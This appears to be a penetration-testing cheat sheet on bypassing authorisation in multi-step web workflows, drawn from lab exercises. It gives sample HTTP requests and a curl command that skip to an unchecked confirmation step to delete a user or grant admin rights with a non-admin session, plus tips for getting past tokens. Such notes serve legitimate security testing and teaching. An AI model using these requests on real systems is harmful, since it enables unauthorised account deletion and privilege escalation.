# Multi-Step Process Bypass

## When this applies

- Workflow with multiple HTTP requests where authorization is checked on the first step but not on subsequent steps.
- Confirmation flows: `/admin/delete?user=X` (checked) → `/admin/delete?user=X&confirmed=true` (NOT checked).
- Wizards / checkout flows that store state in cookies/session and trust prior step's identity assertion.

## Technique

Skip directly to the final step (often a confirmation or "execute" endpoint) — the server assumes you came from the previous step and inherits its authorization.

**Vulnerable Workflow:**
```
Step 1: /admin/delete?user=carlos        [Checked]
Step 2: /admin/delete?user=carlos&confirm=true  [NOT Checked!]
```

## Steps

Lab — Multi-Step Bypass:
```http
# Skip to confirmation step
POST /admin-roles HTTP/1.1
Cookie: [non-admin-session]

username=wiener&action=upgrade&confirmed=true
```

Direct cURL:
```bash
# Skip directly to confirmation
curl -X POST "https://target.com/admin/delete" \
  -d "user=carlos&confirmed=true" \
  -H "Cookie: [non-admin-session]"
```

Multi-Step Skipping:
```http
# Step 1 (protected)
POST /admin/delete?user=carlos

# Step 2 (not protected)
POST /admin/delete?user=carlos&confirmed=true
```

## Verifying success

- Final action executes (user deleted, payment processed) without going through the gated first step.
- Audit logs (if visible) show the action under your identity rather than rejecting it.
- Status `200`/`302` response with a "success" page rather than `403`.

## Common pitfalls

- Some applications stash a one-time token in the session at step 1 — you may need to perform step 1 once with ANY user to populate the session, then change roles.
- POST→GET conversion (see `method-bypass.md`) often combines well with multi-step skipping.
- Some confirmations require a CSRF token — fetch it once via a GET before submitting.

## Tools

- Burp Suite Repeater (capture intermediate-step requests)
- Burp Suite Sequencer (analyze if confirmation tokens are predictable)
- curl
